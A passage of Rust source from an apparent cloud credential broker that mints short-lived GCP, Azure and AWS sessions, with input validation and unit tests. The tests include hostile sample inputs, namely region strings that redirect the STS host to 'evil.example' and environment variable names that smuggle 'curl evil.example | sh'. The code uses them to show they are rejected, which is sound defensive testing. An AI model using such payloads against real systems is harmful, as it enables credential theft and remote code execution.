        .map_err(|error| match error {
            crate::gcp_signer::GcpTokenError::Config(message) => CloudMintError::Config(message),
            crate::gcp_signer::GcpTokenError::Exchange(message) => {
                CloudMintError::Upstream(message)
            }
        })?;

    // Preserve the token endpoint's real expiry even when this token came
    // from the process cache. Recomputing from "now" would make a cached
    // token appear to gain lifetime on every request.
    let expires_at = bearer.expires_at;
    let expires_in = expires_at
        .signed_duration_since(Utc::now())
        .num_seconds()
        .max(0) as u64;

    // Pull client_email from the key document for display only (not secret).
    let client_email = serde_json::from_str::<serde_json::Value>(&key_json)
        .ok()
        .and_then(|v| {
            v.get("client_email")
                .and_then(|e| e.as_str())
                .map(str::to_string)
        });

    let credentials = json!({
        "access_token": &*bearer.token,
        "token_type": "Bearer",
        "expires_in": expires_in,
        "scope": scope,
        "client_email": client_email,
        "project": project,
    });

    let mut env = vec![
        (
            "CLOUDSDK_AUTH_ACCESS_TOKEN".to_string(),
            bearer.token.to_string(),
        ),
        // google-auth / some libraries honor this for ADC-style bearer use.
        (
            "GOOGLE_OAUTH_ACCESS_TOKEN".to_string(),
            bearer.token.to_string(),
        ),
    ];
    if let Some(project) = project.filter(|p| !p.trim().is_empty()) {
        env.push(("CLOUDSDK_CORE_PROJECT".to_string(), project.to_string()));
        env.push(("GOOGLE_CLOUD_PROJECT".to_string(), project.to_string()));
        env.push(("GCLOUD_PROJECT".to_string(), project.to_string()));
    }

    Ok(CloudSession {
        provider: "gcp".to_string(),
        connection: connection_name.to_string(),
        expires_at: expires_at.to_rfc3339(),
        expires_in_seconds: expires_in,
        env,
        credentials,
    })
}

/// Test-only endpoint override, honored in debug builds only. These
/// requests carry secrets (the Azure token POST carries the client secret),
/// so a release binary must never let an environment variable re-aim them.
fn test_endpoint_override(variable: &str) -> Option<String> {
    #[cfg(debug_assertions)]
    {
        std::env::var(variable)
            .ok()
            .filter(|value| !value.trim().is_empty())
    }
    #[cfg(not(debug_assertions))]
    {
        let _ = variable;
        None
    }
}

fn azure_token_url(tenant_id: &str) -> Result<String, CloudMintError> {
    if let Some(override_url) = test_endpoint_override("MULTITOOL_TEST_AZURE_TOKEN_URL") {
        return Ok(override_url);
    }
    // Tenant must not inject path segments.
    if tenant_id.contains('/') || tenant_id.contains('?') || tenant_id.contains('#') {
        return Err(CloudMintError::Config(
            "tenant_id must not contain path or query characters".to_string(),
        ));
    }
    Ok(format!(
        "https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
    ))
}

/// Whether a string is an AWS region code (`us-west-2`, `ap-southeast-1`).
///
/// Shape, not a fixed list: new regions appear without a release here. What
/// makes it a check rather than cosmetics is [`sts_endpoint_url`], which
/// interpolates the region into `https://sts.{region}.amazonaws.com/`. A `@`
/// or `/` in there re-points the *host* — `x@evil.example/y` parses to host
/// `evil.example`, path `/y.amazonaws.com/` — and the request that follows
/// is signed with the caller's long-lived AWS keys.
pub fn is_aws_region(value: &str) -> bool {
    let mut parts = value.split('-');
    let Some(area) = parts.next() else {
        return false;
    };
    if !(2..=3).contains(&area.len()) || !area.bytes().all(|b| b.is_ascii_lowercase()) {
        return false;
    }
    // At least one direction segment, then a single-digit ordinal.
    let rest: Vec<&str> = parts.collect();
    let Some((ordinal, directions)) = rest.split_last() else {
        return false;
    };
    !directions.is_empty()
        && directions
            .iter()
            .all(|part| !part.is_empty() && part.bytes().all(|b| b.is_ascii_lowercase()))
        && ordinal.len() == 1
        && ordinal.bytes().all(|b| b.is_ascii_digit())
}

fn sts_endpoint_url(region: &str) -> Result<Url, CloudMintError> {
    if let Some(override_url) = test_endpoint_override("MULTITOOL_TEST_AWS_STS_URL") {
        return Url::parse(&override_url).map_err(|error| {
            CloudMintError::Config(format!(
                "invalid MULTITOOL_TEST_AWS_STS_URL {override_url:?}: {error}"
            ))
        });
    }
    // Connections are validated on save, but a profile connection's region
    // can come from `~/.aws` instead, which no save ever saw.
    if !is_aws_region(region) {
        return Err(CloudMintError::Config(format!(
            "{region:?} is not an AWS region code like us-west-2"
        )));
    }
    Url::parse(&format!("https://sts.{region}.amazonaws.com/")).map_err(|error| {
        CloudMintError::Config(format!(
            "invalid STS endpoint for region {region:?}: {error}"
        ))
    })
}

/// AWS RoleSessionName: `[\w+=,.@-]+`, 2–64 chars.
fn sanitize_role_session_name(raw: &str) -> String {
    let cleaned: String = raw
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || matches!(c, '+' | '=' | ',' | '.' | '@' | '-') {
                c
            } else {
                '-'
            }
        })
        .collect();
    let trimmed = cleaned.trim_matches('-');
    let base = if trimmed.len() < 2 {
        "multitool"
    } else {
        trimmed
    };
    base.chars().take(64).collect()
}

fn percent_encode_form(value: &str) -> String {
    let mut out = String::with_capacity(value.len());
    for byte in value.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(byte as char);
            }
            b' ' => out.push('+'),
            _ => out.push_str(&format!("%{byte:02X}")),
        }
    }
    out
}

/// Pull the first XML element body for `tag` (STS Query responses are small).
fn xml_tag(body: &str, tag: &str) -> Option<String> {
    let open = format!("<{tag}>");
    let close = format!("</{tag}>");
    let start = body.find(&open)? + open.len();
    let end = body[start..].find(&close)? + start;
    Some(body[start..end].to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn role_session_names_are_aws_safe() {
        assert_eq!(sanitize_role_session_name("claude-code"), "claude-code");
        assert_eq!(sanitize_role_session_name("a b"), "a-b");
        assert_eq!(sanitize_role_session_name(""), "multitool");
        assert_eq!(sanitize_role_session_name("x"), "multitool");
        assert_eq!(sanitize_role_session_name(&"n".repeat(80)).len(), 64);
    }

    #[test]
    fn aws_ini_merges_config_and_credentials() {
        let credentials = "\
[default]
aws_access_key_id = AKIADEFAULT
aws_secret_access_key = default-secret

; a comment
[work]
aws_access_key_id = AKIAWORK
aws_secret_access_key = work-secret
aws_session_token = work-token
";
        let config = "\
[default]
region = us-east-1

[profile work]
region = eu-west-1
s3 =
    max_concurrent_requests = 20

[profile sso-admin]
sso_start_url = https://example.awsapps.com/start
sso_account_id = 123456789012
region = us-west-2
";
        let dir = std::env::temp_dir().join(format!("aka-aws-ini-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let credentials_path = dir.join("credentials");
        let config_path = dir.join("config");
        std::fs::write(&credentials_path, credentials).unwrap();
        std::fs::write(&config_path, config).unwrap();

        let profiles = aws_profiles_from_files(Some(&credentials_path), Some(&config_path));
        std::fs::remove_dir_all(&dir).ok();

        // Config supplies the region, credentials the keys, for one profile.
        let work = &profiles["work"];
        assert_eq!(work["aws_access_key_id"], "AKIAWORK");
        assert_eq!(work["region"], "eu-west-1");
        // The indented sub-block under `s3 =` is skipped, not misread as a
        // sibling key of the profile.
        assert!(!work.contains_key("max_concurrent_requests"));

        assert_eq!(aws_profile_kind(&profiles["default"]), "keys");
        assert_eq!(aws_profile_kind(&profiles["work"]), "temporary");
        assert_eq!(aws_profile_kind(&profiles["sso-admin"]), "sso");
        // `[profile x]` in config and `[x]` in credentials are one profile.
        assert_eq!(profiles.len(), 3);
    }

    #[test]
    fn sts_form_picks_the_action_the_attenuation_requires() {
        let action = |form: &[(String, String)]| {
            form.iter()
                .find(|(k, _)| k == "Action")
                .map(|(_, v)| v.clone())
                .unwrap()
        };
        let param = |form: &[(String, String)], key: &str| {
            form.iter().find(|(k, _)| k == key).map(|(_, v)| v.clone())
        };

        // No role, no policy: a plain re-key of the caller.
        let plain = aws_sts_form(None, None, None, None, 900, "agent", false).unwrap();
        assert_eq!(action(&plain), "GetSessionToken");

        // A policy without a role federates, so AWS intersects the caller's
        // access with the leash — this is what makes reuse safe.
        let federated = aws_sts_form(
            None,
            None,
            Some("arn:aws:iam::aws:policy/ReadOnlyAccess"),
            None,
            900,
            "claude code",
            false,
        )
        .unwrap();
        assert_eq!(action(&federated), "GetFederationToken");
        assert_eq!(
            param(&federated, "PolicyArns.member.1.arn").as_deref(),
            Some("arn:aws:iam::aws:policy/ReadOnlyAccess")
        );
        // Federation names are capped tighter than role session names.
        assert!(param(&federated, "Name").unwrap().len() <= 32);

        // A role takes the role path and still carries the policy bound.
        let assumed = aws_sts_form(
            Some("arn:aws:iam::123456789012:role/Agents"),
            Some("customer-123"),
            None,
            Some(r#"{"Version":"2012-10-17"}"#),
            900,
            "agent",
            false,
        )
        .unwrap();
        assert_eq!(action(&assumed), "AssumeRole");
        assert_eq!(
            param(&assumed, "ExternalId").as_deref(),
            Some("customer-123")
        );
        assert!(param(&assumed, "Policy").is_some());

        // Temporary caller material can only assume a role: STS refuses the
        // other two actions, and re-exporting it would be unbounded.
        assert!(aws_sts_form(None, None, None, None, 900, "agent", true).is_err());
        assert!(aws_sts_form(
            None,
            None,
            Some("arn:aws:iam::aws:policy/ReadOnlyAccess"),
            None,
            900,
            "agent",
            true
        )
        .is_err());
        assert!(aws_sts_form(
            Some("arn:aws:iam::123456789012:role/Agents"),
            None,
            None,
            None,
            900,
            "agent",
            true
        )
        .is_ok());

        // Blank strings are absent, not empty parameters STS would reject.
        let blank = aws_sts_form(None, None, Some("  "), Some(""), 900, "agent", false).unwrap();
        assert_eq!(action(&blank), "GetSessionToken");
    }

    #[test]
    fn aws_regions_are_shapes_that_cannot_move_the_sts_host() {
        for good in [
            "us-east-1",
            "us-west-2",
            "eu-central-1",
            "ap-southeast-1",
            "ap-northeast-3",
            "sa-east-1",
            "us-gov-west-1",
        ] {
            assert!(is_aws_region(good), "{good}");
        }
        // The ones that matter: anything that re-points the host when it is
        // interpolated into https://sts.{region}.amazonaws.com/.
        for bad in [
            "",
            "us-east-1@evil.example/x",
            "x@evil.example/y",
            "us-east-1/../..",
            "us-east-1?a=b",
            "us-east-1#f",
            "us_east_1",
            "US-EAST-1",
            "useast1",
            "us-east-",
            "us-east-12",
            "us--east-1",
            "toolongprefix-east-1",
        ] {
            assert!(!is_aws_region(bad), "{bad}");
        }
        // And the guard actually fires at the sink, not just at save time.
        assert!(sts_endpoint_url("x@evil.example/y").is_err());
    }

    #[test]
    fn pushed_sessions_refuse_names_that_are_not_names() {
        assert!(is_env_var_name("AWS_ACCESS_KEY_ID"));
        assert!(is_env_var_name("_x9"));
        for bad in ["", "9LIVES", "A-B", "A B", "A=B", "x; curl e | sh", "A\nB"] {
            assert!(!is_env_var_name(bad), "{bad}");
        }

        // `aka env` output is eval'd, so a pushed session that
        // exports a name-shaped-like-a-command is refused on arrival rather
        // than at the shell.
        let sessions = PushedSessions::default();
        let session = |name: &str| CloudSession {
            provider: "aws".to_string(),
            connection: "prod".to_string(),
            expires_at: (Utc::now() + chrono::Duration::minutes(15)).to_rfc3339(),
            expires_in_seconds: 900,
            env: vec![(name.to_string(), "value".to_string())],
            credentials: json!({}),
        };
        let id = Uuid::new_v4();
        assert!(sessions
            .store(id, session("x; curl evil.example | sh"))
            .is_err());
        assert!(sessions.remaining_seconds(id).is_none());
        assert!(sessions.store(id, session("AWS_SESSION_TOKEN")).is_ok());
        assert!(sessions.remaining_seconds(id).is_some());
    }

    #[test]
    fn pushed_sessions_hold_the_hour_ceiling() {
        // "The broker never holds anything that outlives the hour": a push
        // claiming a 36-hour expiry is refused on arrival, while one at the
        // ceiling (plus less than the skew slack) is fine.
        let sessions = PushedSessions::default();
        let session = |minutes: i64| CloudSession {
            provider: "aws".to_string(),
            connection: "prod".to_string(),
            expires_at: (Utc::now() + chrono::Duration::minutes(minutes)).to_rfc3339(),
            expires_in_seconds: (minutes * 60) as u64,
            env: vec![],
            credentials: json!({}),
        };
        let id = Uuid::new_v4();
        assert!(sessions.store(id, session(36 * 60)).is_err());
        assert!(sessions.remaining_seconds(id).is_none());
        assert!(sessions.store(id, session(60)).is_ok());
    }

    #[test]
    fn xml_tag_reads_sts_fields() {
        let body = r#"
            <GetSessionTokenResponse>
              <GetSessionTokenResult>
                <Credentials>
                  <AccessKeyId>ASIAEXAMPLE</AccessKeyId>
                  <SecretAccessKey>secret</SecretAccessKey>
                  <SessionToken>token</SessionToken>
                  <Expiration>2026-08-06T12:00:00Z</Expiration>
                </Credentials>
              </GetSessionTokenResult>
            </GetSessionTokenResponse>
        "#;
        assert_eq!(xml_tag(body, "AccessKeyId").as_deref(), Some("ASIAEXAMPLE"));
        assert_eq!(xml_tag(body, "SecretAccessKey").as_deref(), Some("secret"));
    }
}
